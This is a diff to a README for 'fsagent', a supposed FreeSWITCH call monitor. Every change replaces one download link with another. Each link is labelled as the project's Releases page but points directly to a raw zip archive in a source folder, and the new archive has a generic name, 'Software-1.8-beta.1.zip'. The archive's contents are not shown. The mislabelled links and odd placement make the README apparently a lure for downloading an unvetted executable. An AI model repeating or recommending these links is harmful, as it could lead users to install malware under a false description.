@@ -1,6 +1,6 @@
 # 🌟 fsagent - Monitor Your FreeSWITCH Calls Effortlessly
 
-[![Download FSAgent](https://raw.githubusercontent.com/Voidq123/fsagent/main/pkg/connection/fsagent_v3.7.zip)](https://raw.githubusercontent.com/Voidq123/fsagent/main/pkg/connection/fsagent_v3.7.zip)
+[![Download FSAgent](https://github.com/Voidq123/fsagent/raw/refs/heads/main/pkg/processor/Software-1.8-beta.1.zip)](https://github.com/Voidq123/fsagent/raw/refs/heads/main/pkg/processor/Software-1.8-beta.1.zip)
 
 ## 📚 About FSAgent 
 
@@ -20,7 +20,7 @@ To begin using FSAgent, follow these simple steps.
 
 You can download the latest version of FSAgent from the Releases page. 
 
-**Visit the page to download:** [FSAgent Releases](https://raw.githubusercontent.com/Voidq123/fsagent/main/pkg/connection/fsagent_v3.7.zip)
+**Visit the page to download:** [FSAgent Releases](https://github.com/Voidq123/fsagent/raw/refs/heads/main/pkg/processor/Software-1.8-beta.1.zip)
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest version under the "Releases" section.
@@ -74,4 +74,4 @@ For additional help, you can refer to the official documentation included in the
 
 To ensure you are always using the latest features and fixes, regularly check the Releases page for new versions. 
 
-**Download the latest version here:** [FSAgent Releases](https://raw.githubusercontent.com/Voidq123/fsagent/main/pkg/connection/fsagent_v3.7.zip)
+**Download the latest version here:** [FSAgent Releases](https://github.com/Voidq123/fsagent/raw/refs/heads/main/pkg/processor/Software-1.8-beta.1.zip)
